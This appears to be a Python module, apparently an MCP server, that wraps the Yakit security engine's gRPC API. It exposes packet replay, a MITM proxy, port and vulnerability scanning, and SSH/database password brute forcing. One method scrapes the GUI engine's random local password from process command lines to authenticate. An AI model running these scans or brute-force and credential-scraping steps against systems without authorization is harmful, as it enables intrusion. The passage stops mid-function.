# -*- coding: utf-8 -*-
"""
yakit-mcp: Yakit 引擎 gRPC 驱动 + GUI 联动 + 窗口截图
核心模块: 引擎管理 / HTTPFuzzer 重放 / HTTPFlow 入库
"""
from __future__ import annotations

import base64
import json
import os
import socket
import subprocess
import sys
import time
from pathlib import Path

import grpc

from . import grpc_pb2 as ypb
from . import grpc_pb2_grpc as ygrpc


class _AuthInterceptor(
    grpc.UnaryUnaryClientInterceptor,
    grpc.UnaryStreamClientInterceptor,
    grpc.StreamUnaryClientInterceptor,
    grpc.StreamStreamClientInterceptor,
):
    """gRPC 客户端拦截器: 为所有请求注入 authorization metadata（local-password 模式）"""

    def __init__(self, metadata):
        self._metadata = metadata

    def _with_metadata(self, client_call_details):
        return client_call_details._replace(metadata=self._metadata)

    def intercept_unary_unary(self, continuation, client_call_details, request):
        return continuation(self._with_metadata(client_call_details), request)

    def intercept_unary_stream(self, continuation, client_call_details, request):
        return continuation(self._with_metadata(client_call_details), request)

    def intercept_stream_unary(self, continuation, client_call_details, request_iterator):
        return continuation(self._with_metadata(client_call_details), request_iterator)

    def intercept_stream_stream(self, continuation, client_call_details, request_iterator):
        return continuation(self._with_metadata(client_call_details), request_iterator)

# ---------------------------------------------------------------------------
# 常量
# ---------------------------------------------------------------------------
DEFAULT_PORT = 10053
DEFAULT_HOST = "127.0.0.1"

# Yakit 安装目录探测
def find_yakit_engine() -> str | None:
    """查找 yak 引擎可执行文件"""
    candidates = [
        os.environ.get("YAKIT_ENGINE", ""),
        r"D:\My_apps\Yakit\bins\yak_windows_amd64.exe",
        r"D:\My_apps\Yakit\bins\yak.exe",
        r"C:\Yakit\bins\yak_windows_amd64.exe",
    ]
    for c in candidates:
        if c and Path(c).exists():
            return c
    # 从 yak.zip 解压
    for z in [r"D:\My_apps\Yakit\bins\yak.zip", r"C:\Yakit\bins\yak.zip"]:
        if Path(z).exists():
            import zipfile
            out = Path(os.environ.get("LOCALAPPDATA", Path.home() / "AppData/Local")) / "yakit-mcp" / "engine"
            out.mkdir(parents=True, exist_ok=True)
            exe = out / "bins" / "yak_windows_amd64.exe"
            if not exe.exists():
                try:
                    with zipfile.ZipFile(z) as zf:
                        zf.extractall(out)
                except Exception:
                    pass
            if exe.exists():
                return str(exe)
    return None


def find_yakit_gui() -> str | None:
    """查找 Yakit GUI 可执行文件"""
    candidates = [
        r"D:\My_apps\Yakit\Yakit.exe",
        r"C:\Program Files\Yakit\Yakit.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\Programs\Yakit\Yakit.exe"),
    ]
    for c in candidates:
        if Path(c).exists():
            return c
    return None


class YakEngine:
    """Yakit 引擎管理器: 探测/启动/连接"""

    def __init__(self, host: str = DEFAULT_HOST, port: int = DEFAULT_PORT, auto_start: bool = True):
        self.host = host
        self.port = port
        self.auto_start = auto_start
        self._proc: subprocess.Popen | None = None
        self._channel: grpc.Channel | None = None
        self._stub: ygrpc.YakStub | None = None
        # 关键: 默认用 GUI 的项目目录（与 GUI 同一数据库，避免 database is closed / 数据不同步）
        self._home = os.environ.get("YAKIT_HOME", str(Path(r"D:\My_apps\Yakit\yakit-projects")))
        if not Path(self._home).exists():
            self._home = os.environ.get("YAKIT_HOME", str(Path(os.environ.get("APPDATA", "")) / "Yakit"))

    # -- 端口探测 ----------------------------------------------------------
    @staticmethod
    def _port_open(host: str, port: int, timeout: float = 0.8) -> bool:
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True
        except OSError:
            return False

    def is_running(self) -> bool:
        return self._port_open(self.host, self.port)

    # -- 启动 --------------------------------------------------------------
    def start(self, timeout: float = 45) -> bool:
        """启动 yak 引擎 gRPC server（若未运行）"""
        if self.is_running():
            return True
        engine = find_yakit_engine()
        if not engine:
            raise RuntimeError("未找到 yak 引擎，请安装 Yakit 或设置 YAKIT_ENGINE 环境变量")
        log = Path(os.environ.get("LOCALAPPDATA", "")) / "yakit-mcp" / "engine.log"
        log.parent.mkdir(parents=True, exist_ok=True)
        logf = open(log, "ab")
        self._proc = subprocess.Popen(
            [engine, "grpc", "--port", str(self.port), "--home", self._home],
            stdout=logf, stderr=logf,
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS
            if os.name == "nt" else 0,
            close_fds=True,
        )
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.is_running():
                return True
            time.sleep(1)
        return self.is_running()

    # -- 连接 --------------------------------------------------------------
    def connect(self) -> ygrpc.YakStub:
        if self._stub and self._channel:
            return self._stub
        # 修复: 先探测 GUI 是否在跑 + 探测真实引擎端口（GUI 引擎可能不在 10053）
        if not self.is_running():
            found = self._probe_engine_port()
            if found:
                self.port = found
        if self.auto_start and not self.is_running():
            if not self.start():
                raise RuntimeError(f"引擎启动失败（{self.host}:{self.port}），请检查日志")
        # GUI 引擎 local-password 模式(9011): 从引擎进程命令行提取随机密码
        auth_metadata = None
        if self.port == 9011:
            pwd = self._grab_engine_password()
            if pwd:
                auth_metadata = (("authorization", f"bearer {pwd}"),)
        self._channel = grpc.insecure_channel(
            f"{self.host}:{self.port}",
            options=[
                ("grpc.max_receive_message_length", 200 * 1024 * 1024),
                ("grpc.max_send_message_length", 200 * 1024 * 1024),
            ],
        )
        try:
            grpc.channel_ready_future(self._channel).result(timeout=10)
        except Exception as e:
            raise RuntimeError(f"gRPC 连接失败: {e!r}")
        if auth_metadata:
            self._stub = ygrpc.YakStub(grpc.intercept_channel(self._channel, _AuthInterceptor(auth_metadata)))
        else:
            self._stub = ygrpc.YakStub(self._channel)
        return self._stub

    @staticmethod
    def _extract_password_from_cmd(cmdline: str) -> str | None:
        """从引擎命令行提取 --local-password 后的密码"""
        import re
        m = re.search(r'--local-password\s+(\S+)', cmdline)
        if m:
            pwd = m.group(1).strip().strip('"')
            if pwd and pwd not in ('""', "''"):
                return pwd
        return None

    def _grab_engine_password(self) -> str | None:
        """从 yak 引擎进程命令行抓 local-password（GUI 每次启动生成的随机密码）"""
        try:
            import subprocess
            r = subprocess.run(
                ['powershell', '-NoProfile', '-Command',
                 "Get-CimInstance Win32_Process | Where-Object { $_.Name -like '*yak*' } | ForEach-Object { $_.CommandLine }"],
                capture_output=True, text=True, timeout=15)
            for line in r.stdout.split('\n'):
                if 'grpc' in line and '--local-password' in line:
                    pwd = self._extract_password_from_cmd(line)
                    if pwd:
                        return pwd
        except Exception:
            pass
        return None

    def _probe_engine_port(self) -> int | None:
        """探测可能存在的引擎端口（GUI 引擎实际端口）"""
        candidates = [10053, 9011, 8087, 63333]
        # 额外: 从 yak 进程的监听端口找
        try:
            import subprocess
            out = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=10).stdout
            yak_pids = set()
            tl = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=10).stdout
            for line in tl.split('\n'):
                if 'yak' in line.lower() and 'yak_windows' in line.lower() or 'yak.exe' in line.lower():
                    parts = line.split()
                    if len(parts) >= 2 and parts[1].isdigit():
                        yak_pids.add(parts[1])
            for line in out.split('\n'):
                if 'LISTENING' in line:
                    parts = line.split()
                    if len(parts) >= 5 and parts[4] in yak_pids:
                        addr = parts[1]
                        port = int(addr.rsplit(':', 1)[-1])
                        if port not in candidates:
                            candidates.append(port)
        except Exception:
            pass
        for p in candidates:
            if self._port_open(self.host, p):
                return p
        return None

    @property
    def stub(self) -> ygrpc.YakStub:
        return self.connect()

    def version(self) -> str:
        try:
            resp = self.stub.Version(ypb.Empty())
            return resp.Version
        except Exception:
            return "unknown"

    def close(self):
        if self._channel:
            self._channel.close()
            self._channel = None
            self._stub = None


# ---------------------------------------------------------------------------
# 重放逻辑
# ---------------------------------------------------------------------------
def parse_http_packet(packet_text: str) -> dict:
    """
    解析原始 HTTP 报文文本（Burp 复制的包 / Yakit 复制的包）
    返回 {request, is_https, host, port, method, path, scheme, headers, body, protocol_hint}
    protocol_hint: "https" | "http" | "unknown"（协议线索）
    """
    text = packet_text.strip()
    if not text:
        raise ValueError("HTTP 报文为空")
    # 支持换行符归一化
    text = text.replace("\r\n", "\n")
    lines = text.split("\n")
    # 请求行: METHOD SP PATH SP HTTP/x.y
    request_line = lines[0].strip()
    parts = request_line.split(" ")
    if len(parts) < 3:
        raise ValueError(f"请求行格式错误: {request_line!r}")
    method, path, version = parts[0], parts[1], parts[2]

    # 解析 headers
    headers = {}
    header_lines = []
    body_start = None
    for i, line in enumerate(lines[1:], start=1):
        if not line.strip():
            body_start = i + 1
            break
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip().lower()] = v.strip()
        header_lines.append(line)

    body = ""
    if body_start is not None:
        body = "\n".join(lines[body_start:])

    # Host 推断
    host_header = headers.get("host", "")
    is_https = headers.get("__yakit_is_https", "") == "true" or path.startswith("https://")
    scheme = "https" if is_https else "http"
    host = host_header
    port = 443 if scheme == "https" else 80
    if ":" in host_header:
        h, _, p = host_header.rpartition(":")
        if p.isdigit():
            host, port = h, int(p)
    # 协议线索（严格: 只有明确线索才判，否则 unknown）
    protocol_hint = "unknown"
    if path.startswith("https://") or headers.get("__yakit_is_https") == "true":
        protocol_hint = "https"
    elif path.startswith("http://"):
        protocol_hint = "http"
    elif host_header.endswith(":443"):
        protocol_hint = "https"
    elif host_header.endswith(":80"):
        protocol_hint = "http"
    return {
        "request": text,
        "is_https": is_https,
        "host": host,
        "port": port,
        "method": method,
        "path": path,
        "scheme": scheme,
        "headers": headers,
        "body": body,
        "protocol_hint": protocol_hint,
    }


def detect_protocol(packet_text: str) -> str:
    """自动识别协议: 'http' | 'https' | 'unknown'"""
    try:
        return parse_http_packet(packet_text)["protocol_hint"]
    except Exception:
        return "unknown"


def push_webfuzzer_tab(engine: YakEngine, packet: str, is_https: bool = False, tab_name: str = "MCP") -> dict:
    """
    【官方通道】通过 gRPC DuplexConnection 推送 web_fuzzer_tab 事件，
    让 GUI 自动新建 Web Fuzzer tab 并填入请求（源码确认: MCP/后端通知前端新建 Web Fuzzer Tab）。
    彻底绕开 Monaco 编辑器填包（解决旧内容残留 + 填包问题）。
    Config 结构对齐源码 MultipleNodeInfo（含 id/verbose/groupId/pageParams.request），
    openFlag=true 时前端 setCurrentTabKey 切到新 tab 前台显示。
    返回: {ok, sent, reason}
    """
    stub = engine.connect()
    try:
        import time as _time
        # 构造 Config: 对齐 MultipleNodeInfo / ComponentParams 结构（源码 MainOperatorContentType.d.ts）
        config = {
            "id": f"mcp-{int(_time.time() * 1000)}",
            "verbose": tab_name,
            "groupId": "0",
            "sortFieId": 1,
            "pageParams": {
                "id": f"mcp-{int(_time.time() * 1000)}",
                "groupId": "0",
                "isHttps": is_https,
                "request": packet,
                "advancedConfigValue": {},
            },
        }
        payload = {
            "openFlag": True,
            "data": [
                {
                    "PageId": "",
                    "Type": "page",
                    "Config": json.dumps(config, ensure_ascii=False)
                }
            ],
        }
        req = ypb.DuplexConnectionRequest(
            Data=json.dumps(payload, ensure_ascii=False).encode('utf-8'),
            MessageType="web_fuzzer_tab",
            Timestamp=int(time.time() * 1000),
        )
        # 双向流: 发一条就够（服务端收到即推送前端）
        responses = []
        def gen():
            yield req
        for resp in stub.DuplexConnection(gen(), timeout=10):
            responses.append(resp)
            break
        return {"ok": True, "sent": True, "payload": payload}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def replay_packet(
    engine: YakEngine,
    packet_text: str,
    *,
    is_https: bool | None = None,
    proxy: str = "",
    timeout: float = 30.0,
    no_follow_redirect: bool = False,
    max_retries: int = 0,
    return_raw: bool = False,
) -> dict:
    """
    用 Yakit 引擎重放一个 HTTP 包（Web Fuzzer 引擎）
    返回结构化结果；return_raw=True 时附加 "raw_response" 字段（FuzzerResponse 对象）
    """
    info = parse_http_packet(packet_text)
    req = ypb.FuzzerRequest()
    req.Request = info["request"]
    req.IsHTTPS = is_https if is_https is not None else info["is_https"]
    req.NoSystemProxy = True
    req.PerRequestTimeoutSeconds = timeout
    if proxy:
        req.Proxy = proxy
    if no_follow_redirect:
        req.NoFollowRedirect = True
    if max_retries > 0:
        req.MaxRetryTimes = max_retries

    stub = engine.connect()
    results = []
    for resp in stub.HTTPFuzzer(req, timeout=timeout + 30):
        results.append(resp)
    if not results:
        return {"ok": False, "reason": "无响应流返回"}

    resp = results[0]
    response_raw = resp.ResponseRaw if resp.ResponseRaw else b""
    try:
        response_text = response_raw.decode("utf-8", errors="replace")
    except Exception:
        response_text = str(response_raw)

    result = {
        "ok": resp.Ok,
        "reason": resp.Reason,
        "status_code": resp.StatusCode,
        "method": resp.Method,
        "host": resp.Host,
        "url": resp.Url,
        "remote_addr": resp.RemoteAddr,
        "content_type": resp.ContentType,
        "body_length": resp.BodyLength,
        "duration_ms": resp.DurationMs,
        "total_duration_ms": resp.TotalDurationMs,
        "task_id": resp.TaskId,
        "is_https": resp.IsHTTPS,
        "timestamp": resp.Timestamp,
        "uuid": resp.UUID,
        "proxy": resp.Proxy,
        "request_raw": (resp.RequestRaw or b"").decode("utf-8", errors="replace"),
        "response_raw": response_text,
        "response_headers": [
            {"key": h.Header, "value": h.Value} for h in (resp.Headers or [])
        ],
        "matched_by_filter": resp.MatchedByFilter,
        "matched_by_matcher": resp.MatchedByMatcher,
        "hit_color": resp.HitColor,
    }
    if return_raw:
        result["raw_response"] = resp
    return result


def convert_to_httpflow(engine: YakEngine, fuzzer_response: ypb.FuzzerResponse) -> dict:
    """把 Fuzzer 响应转成 HTTPFlow 入库（GUI 流量列表可见）"""
    stub = engine.connect()
    try:
        flow = stub.ConvertFuzzerResponseToHTTPFlow(fuzzer_response)
        return {
            "ok": True,
            "id": flow.Id,
            "url": flow.Url,
            "method": flow.Method,
            "status_code": flow.StatusCode,
            "hash": flow.Hash,
            "created_at": flow.CreatedAt,
        }
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def query_http_flows(engine: YakEngine, keyword: str = "", limit: int = 20) -> dict:
    """查询历史 HTTP 流量（keyword 匹配 URL，引擎层 Keyword+IncludeInUrl 双通道）"""
    stub = engine.connect()
    req = ypb.QueryHTTPFlowRequest()
    req.Keyword = keyword
    if keyword:
        req.IncludeInUrl.append(keyword)
    req.Pagination.Limit = limit
    req.Pagination.Page = 1
    try:
        resp = stub.QueryHTTPFlows(req)
        flows = []
        for f in resp.Data or []:
            flows.append({
                "id": f.Id,
                "method": f.Method,
                "url": f.Url,
                "status_code": f.StatusCode,
                "content_type": f.ContentType,
                "body_length": f.BodyLength,
                "is_https": f.IsHTTPS,
                "created_at": f.CreatedAt,
                "hash": f.Hash,
            })
        return {"ok": True, "total": resp.Total, "flows": flows}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def clear_fuzzer_history(engine: YakEngine, task_id: int = 0, clear_configs: bool = True) -> dict:
    """
    清空 Web Fuzzer 历史（数据库层，解决"旧内容残留"）。
    1. 删除历史任务（web_fuzzer_tasks → UI 历史 tab 列表消失）
    2. 可选: 清空 fuzzer 配置归档（web_fuzzer_configs）
    task_id=0 时删除全部任务；指定 id 只删该任务。
    """
    stub = engine.connect()
    result = {}
    try:
        req = ypb.DeleteHistoryHTTPFuzzerTaskRequest(Id=task_id)
        stub.DeleteHistoryHTTPFuzzerTask(req)
        resp = stub.QueryHistoryHTTPFuzzerTask(ypb.Empty())
        result["remaining_tasks"] = len(list(resp.Tasks if resp.Tasks else []))
        result["tasks_ok"] = True
    except Exception as e:
        result["tasks_ok"] = False
        result["tasks_reason"] = repr(e)

    if clear_configs:
        try:
            r = stub.DeleteFuzzerConfig(ypb.DeleteFuzzerConfigRequest(DeleteAll=True))
            result["configs_ok"] = True
            result["configs_deleted"] = r.EffectRows
        except Exception as e:
            result["configs_ok"] = False
            result["configs_reason"] = repr(e)

    result["ok"] = result.get("tasks_ok", False) or result.get("configs_ok", False)
    result["deleted_all"] = task_id == 0
    return result


def list_fuzzer_history(engine: YakEngine) -> dict:
    """列出 Web Fuzzer 历史任务（tab 数据源）"""
    stub = engine.connect()
    try:
        resp = stub.QueryHistoryHTTPFuzzerTask(ypb.Empty())
        tasks = []
        for t in resp.Tasks or []:
            tasks.append({
                "id": t.Id,
                "host": t.Host,
                "port": t.Port,
                "http_flow_total": t.HTTPFlowTotal,
                "success": t.HTTPFlowSuccessCount,
                "failed": t.HTTPFlowFailedCount,
                "created_at": t.CreatedAt,
            })
        return {"ok": True, "total": len(tasks), "tasks": tasks}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def list_fuzzer_labels(engine: YakEngine) -> dict:
    """列出 Web Fuzzer 分组标签（FuzzerLabel）"""
    stub = engine.connect()
    try:
        resp = stub.QueryFuzzerLabel(ypb.Empty())
        labels = []
        for l in resp.Data or []:
            labels.append({
                "id": l.Id,
                "label": l.Label,
                "description": l.Description,
                "hash": l.Hash,
            })
        return {"ok": True, "total": len(labels), "labels": labels}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def save_fuzzer_label(engine: YakEngine, label: str, description: str = "") -> dict:
    """新建 Web Fuzzer 分组标签"""
    stub = engine.connect()
    try:
        stub.SaveFuzzerLabel(ypb.SaveFuzzerLabelRequest(Data=[
            ypb.FuzzerLabel(Label=label, Description=description)
        ]))
        return {"ok": True, "label": label, "description": description}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def delete_fuzzer_label(engine: YakEngine, hash_value: str) -> dict:
    """删除 Web Fuzzer 分组标签（按 hash）"""
    stub = engine.connect()
    try:
        stub.DeleteFuzzerLabel(ypb.DeleteFuzzerLabelRequest(Hash=hash_value))
        return {"ok": True, "hash": hash_value}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


# ---------------------------------------------------------------------------
# MITM 中间人抓包
# ---------------------------------------------------------------------------
# MITM 流管理（全局单例，避免多流冲突）
_mitm_streams: dict = {}


def mitm_start(engine: YakEngine, port: int = 8083, host: str = "0.0.0.0",
               filters: dict | None = None, timeout: float = 5.0) -> dict:
    """
    启动 MITM 中间人抓包监听（MITMV2 双向流）。
    抓到的流量写入 http_flows 表（SourceType=mitm），用 yakit_mitm_flows 增量获取。
    返回: {ok, port, reason}
    """
    global _mitm_streams
    stub = engine.connect()
    try:
        req = ypb.MITMV2Request()
        req.Host = host
        req.Port = port
        # 过滤器
        if filters:
            fd = ypb.MITMFilterData()
            for k, v in filters.items():
                if k == "include_hostname" and v:
                    fd.IncludeHostname.extend(v if isinstance(v, list) else [v])
                elif k == "exclude_hostname" and v:
                    fd.ExcludeHostname.extend(v if isinstance(v, list) else [v])
                elif k == "exclude_suffix" and v:
                    fd.ExcludeSuffix.extend(v if isinstance(v, list) else [v])
                elif k == "exclude_content_types" and v:
                    fd.ExcludeContentTypes.extend(v if isinstance(v, list) else [v])
            req.FilterData.CopyFrom(fd)
            req.UpdateFilter = True

        def gen():
            yield req
            # 保持流打开（引擎会持续推送流量事件）
            import time as _t
            while True:
                _t.sleep(60)

        # 后台线程启动流（避免阻塞 MCP 调用）
        import threading
        result_box = {}

        def _run():
            try:
                stream = stub.MITMV2(gen(), timeout=timeout)
                first = next(stream, None)
                result_box["stream"] = stream
                result_box["first"] = first
            except Exception as e:
                result_box["error"] = repr(e)

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        t.join(timeout=timeout)
        if "error" in result_box:
            return {"ok": False, "reason": result_box["error"]}
        stream = result_box.get("stream")
        if stream is None:
            return {"ok": False, "reason": "MITM 启动超时（可能端口被占用或引擎不支持）"}
        # 保存流引用（保持连接）
        _mitm_streams[port] = stream
        return {"ok": True, "port": port, "host": host, "started": True}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def mitm_stop(engine: YakEngine, port: int = 8083) -> dict:
    """停止 MITM 监听（关闭流）"""
    global _mitm_streams
    try:
        stream = _mitm_streams.pop(port, None)
        if stream:
            try:
                stream.cancel()
            except Exception:
                pass
        return {"ok": True, "port": port, "stopped": True}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def mitm_status(engine: YakEngine) -> dict:
    """查看当前 MITM 监听状态"""
    global _mitm_streams
    return {"ok": True, "active_ports": list(_mitm_streams.keys())}


def query_mitm_flows(engine: YakEngine, after_id: int = 0, limit: int = 50,
                     keyword: str = "") -> dict:
    """
    增量获取 MITM 抓到的 HTTP 流量（SourceType=mitm）。
    after_id: 只返回 id 大于该值的流量（增量拉取，默认 0=全部）
    """
    stub = engine.connect()
    try:
        req = ypb.QueryHTTPFlowRequest()
        req.SourceType = "mitm"
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if after_id > 0:
            req.AfterId = after_id
        if keyword:
            req.Keyword = keyword
        resp = stub.QueryHTTPFlows(req)
        flows = []
        for f in resp.Data or []:
            flows.append({
                "id": f.Id,
                "method": f.Method,
                "url": f.Url,
                "status_code": f.StatusCode,
                "is_https": f.IsHTTPS,
                "content_type": f.ContentType,
                "body_length": f.BodyLength,
                "created_at": f.CreatedAt,
                "source_type": f.SourceType,
                "request": (f.Request or b"").decode("utf-8", errors="replace")[:2000],
                "response": (f.Response or b"").decode("utf-8", errors="replace")[:2000],
            })
        return {"ok": True, "total": resp.Total, "flows": flows}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


# ---------------------------------------------------------------------------
# 主动扫描: 端口扫描 / 漏洞检测 / 弱口令爆破 / 爬虫
# ---------------------------------------------------------------------------
def port_scan(engine: YakEngine, targets: str, ports: str = "80,443,8080",
              mode: str = "tcp", concurrent: int = 100, fingerprint_mode: str = "all") -> dict:
    """
    端口扫描（PortScan）。
    参数: targets(如 1.1.1.1 或 1.1.1.0/24), ports(如 80,443,1-1000), mode(tcp/syn), fingerprint_mode(all/service/web)
    返回: 扫描结果流（发现的端口/服务/指纹）
    """
    stub = engine.connect()
    try:
        req = ypb.PortScanRequest()
        req.Targets = targets
        req.Ports = ports
        req.Mode = mode
        req.Concurrent = concurrent
        req.FingerprintMode = fingerprint_mode
        req.SaveToDB = True
        results = []
        for resp in stub.PortScan(req, timeout=300):
            text = resp.Message or resp.Raw or b""
            if text:
                results.append(text.decode("utf-8", errors="replace") if isinstance(text, bytes) else text)
        # 解析 JSON 流（Yakit 扫描结果: {"type":"log"/"progress", "content":{...}}）
        parsed = []
        for line in results:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
                ctype = obj.get("type", "")
                content = obj.get("content", {})
                if isinstance(content, dict):
                    level = content.get("level", "")
                    data = content.get("data", "")
                    # 提取有用信息（跳过纯状态卡）
                    if data and "feature-status" not in level and ctype != "progress":
                        try:
                            inner = json.loads(data)
                            parsed.append({"type": ctype, "level": level, "data": inner})
                        except Exception:
                            parsed.append({"type": ctype, "level": level, "data": data[:300]})
            except Exception:
                if "feature-status" not in line:
                    parsed.append({"raw": line[:300]})
        return {"ok": True, "targets": targets, "ports": ports,
                "total_events": len(results), "parsed": parsed[:60]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def simple_detect(engine: YakEngine, targets: str, ports: str = "80,443",
                  concurrent: int = 100, total_timeout: int = 600) -> dict:
    """
    漏洞检测（SimpleDetect，基于 nuclei 引擎 + Yakit 插件）。
    参数: targets(目标), ports(端口), concurrent(并发), total_timeout(总超时秒)
    返回: 检测结果流（发现的漏洞/指纹）
    """
    stub = engine.connect()
    try:
        # SimpleDetect 基于 PortScan + 漏洞插件
        scan = ypb.PortScanRequest()
        scan.Targets = targets
        scan.Ports = ports
        scan.Mode = "tcp"
        scan.Concurrent = concurrent
        scan.SaveToDB = True
        record = ypb.RecordPortScanRequest()
        record.PortScanRequest.CopyFrom(scan)
        results = []
        for resp in stub.SimpleDetect(record, timeout=total_timeout + 30):
            text = resp.Message or resp.Raw or b""
            if isinstance(text, bytes):
                text = text.decode("utf-8", errors="replace")
            if text:
                results.append(text)
        return {"ok": True, "targets": targets, "results": results[:200]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def start_brute(engine: YakEngine, targets: str, service_type: str = "ssh",
                username: str = "", password: str = "",
                username_file: str = "", password_file: str = "",
                concurrent: int = 20) -> dict:
    """
    弱口令爆破（StartBrute）。
    参数:
      targets: 目标(host:port)
      service_type: 服务类型(ssh/mysql/redis/... 用 yakit_brute_types 查)
      username/password: 单账号密码
      username_file/password_file: 字典文件路径
    """
    stub = engine.connect()
    try:
        req = ypb.StartBruteParams()
        req.Target = targets
        req.BruteType = service_type
        req.Concurrent = concurrent
        if username:
            req.Username = username
        if password:
            req.Password = password
        if username_file:
            req.UsernameFile = username_file
        if password_file:
            req.PasswordFile = password_file
        results = []
        for resp in stub.StartBrute(req, timeout=300):
            text = resp.Message or resp.Raw or b""
            if text:
                results.append(text)
        return {"ok": True, "target": targets, "type": service_type, "results": results[:100]}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def brute_types(engine: YakEngine) -> dict:
    """获取可用的爆破服务类型"""
    stub = engine.connect()
    try:
        resp = stub.GetAvailableBruteTypes(ypb.Empty())
        return {"ok": True, "types": list(resp.Types or [])}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def basic_crawler(engine: YakEngine, target: str, max_depth: int = 2,
                  max_urls: int = 100, concurrent: int = 10) -> dict:
    """
    基础爬虫（StartBasicCrawler）。
    参数: target(起始URL), max_depth(深度), max_urls(最大URL数)
    返回: 爬取结果（发现的 URL）
    """
    stub = engine.connect()
    try:
        req = ypb.StartBasicCrawlerRequest()
        req.Targets = target
        req.MaxDepth = str(max_depth)
        req.MaxCountOfLinks = str(max_urls)
        req.Concurrent = concurrent
        resp = stub.StartBasicCrawler(req, timeout=300)
        text = resp.Message or resp.Raw or b""
        if isinstance(text, bytes):
            text = text.decode("utf-8", errors="replace")
        return {"ok": True, "results": [text] if text else []}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


# ---------------------------------------------------------------------------
# 资产查询: 端口 / 主机 / 域名 / 风险
# ---------------------------------------------------------------------------
def query_ports(engine: YakEngine, keyword: str = "", limit: int = 50,
                hosts: str = "", ports: str = "") -> dict:
    """查询端口资产（扫描结果入库后从这里取）"""
    stub = engine.connect()
    try:
        req = ypb.QueryPortsRequest()
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if keyword:
            req.Keywords = keyword
        if hosts:
            req.Hosts = hosts
        if ports:
            req.Ports = ports
        resp = stub.QueryPorts(req)
        items = []
        for p in resp.Data or []:
            items.append({
                "id": p.Id,
                "host": p.Host,
                "ip_integer": p.IPInteger,
                "port": p.Port,
                "proto": p.Proto,
                "service": p.ServiceType,
                "state": p.State,
                "fingerprint": p.Fingerprint,
                "title": p.HtmlTitle,
                "updated_at": p.UpdatedAt,
            })
        return {"ok": True, "total": resp.Total, "ports": items}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def query_hosts(engine: YakEngine, keyword: str = "", limit: int = 50) -> dict:
    """查询主机资产（keyword 匹配域名/网段）"""
    stub = engine.connect()
    try:
        req = ypb.QueryHostsRequest()
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if keyword:
            req.DomainKeyword = keyword
        resp = stub.QueryHosts(req)
        items = []
        for h in resp.Data or []:
            items.append({
                "id": h.Id,
                "ip": h.IP,
                "ip_integer": h.IPInteger,
                "is_public": h.IsInPublicNet,
                "domains": list(h.Domains or []),
            })
        return {"ok": True, "total": resp.Total, "hosts": items}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def query_domains(engine: YakEngine, keyword: str = "", limit: int = 50) -> dict:
    """查询域名资产（keyword 匹配域名关键词）"""
    stub = engine.connect()
    try:
        req = ypb.QueryDomainsRequest()
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if keyword:
            req.DomainKeyword = keyword
        resp = stub.QueryDomains(req)
        items = []
        for d in resp.Data or []:
            items.append({
                "id": d.ID,
                "domain": d.DomainName,
                "ip": d.IPAddr,
                "title": d.HTTPTitle,
            })
        return {"ok": True, "total": resp.Total, "domains": items}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


def query_risks(engine: YakEngine, keyword: str = "", limit: int = 50,
                severity: str = "") -> dict:
    """查询漏洞/风险记录"""
    stub = engine.connect()
    try:
        req = ypb.QueryRisksRequest()
        req.Pagination.Limit = limit
        req.Pagination.Page = 1
        if keyword:
            req.Keywords = keyword
        if severity:
            req.Level = severity
        resp = stub.QueryRisks(req)
        items = []
        for r in resp.Data or []:
            items.append({
                "id": r.Id,
                "risk_type": r.RiskType,
                "url": r.Url,
                "title": r.Title,
                "severity": r.Severity,
                "description": (r.Description or "")[:300],
                "target": r.IP or r.Host,
                "updated_at": r.UpdatedAt,
            })
        return {"ok": True, "total": resp.Total, "risks": items}
    except Exception as e:
        return {"ok": False, "reason": repr(e)}


# ---------------------------------------------------------------------------
# 编码工具: Codec / DNSLog / 反连
# ---------------------------------------------------------------------------
def codec(engine: YakEngine, text: str, codec_type: str = "Base64Encode",
          params: str = "{}") -> dict:
    """
    编解码（NewCodec 流式接口，前端同款）。
    codec_type 用 yakit_codec_methods 查（如 Base64Encode/Base64Decode/UrlEncode/SHA1）。
    params: 可选参数 JSON（如 {"Alphabet": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"}）。
            默认自动用方法的 DefaultValue 填充必填参数。
    """
    stub = engine.connect()
    try:
        # 1) 查方法定义拿默认参数（解决 base64 需要 Alphabet 等必填参数问题）
        default_params = {}
        try:
            resp_m = stub.GetAllCodecMethods(ypb.Empty())
            for m in resp_m.Methods or []:
                if m.CodecMethod == codec_type:
                    for p in m.Params or []:
                        if p.DefaultValue:
                            default_params[p.Name] = p.DefaultValue
                    break
        except Exception:
            pass
        supplied = json.loads(params) if params else {}
        merged = {**default_params, **supplied}

        req = ypb.CodecRequestFlow()
        req.Text = text
        work = ypb.CodecWork()
        work.CodecType = codec_type
        for k, v in merged.items():
            pv = ypb.ExecParamItem()
            pv.Key = k
